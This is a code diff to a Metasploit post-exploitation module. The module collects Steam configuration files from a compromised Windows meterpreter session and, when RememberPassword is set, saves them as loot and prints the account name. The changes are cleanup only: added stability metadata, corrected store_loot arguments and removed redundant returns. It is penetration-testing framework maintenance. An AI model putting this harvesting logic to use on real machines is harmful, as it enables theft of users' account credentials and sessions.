@@ -20,6 +20,11 @@ class MetasploitModule < Msf::Post
         'Author' => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -67,18 +72,16 @@ class MetasploitModule < Msf::Post
       if sad =~ /RememberPassword\W*"1"/
         print_status("RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}")
         scd = read_file("#{path}\\#{steamconfig}")
-        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename = steamappdata)
+        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, steamappdata)
         print_good("The file SteamAppData.vdf has been stored on #{steam_app_data_path}")
-        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename = steamconfig)
+        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, steamconfig)
         print_good("The file config.vdf has been stored on #{steam_config_path}")
         print_status('Steam configs harvested successfully!')
       else
         print_error('RememberPassword is not set, exiting.')
-        return
       end
     else
       print_error('Steam configs not found.')
-      return
     end
   end
 end
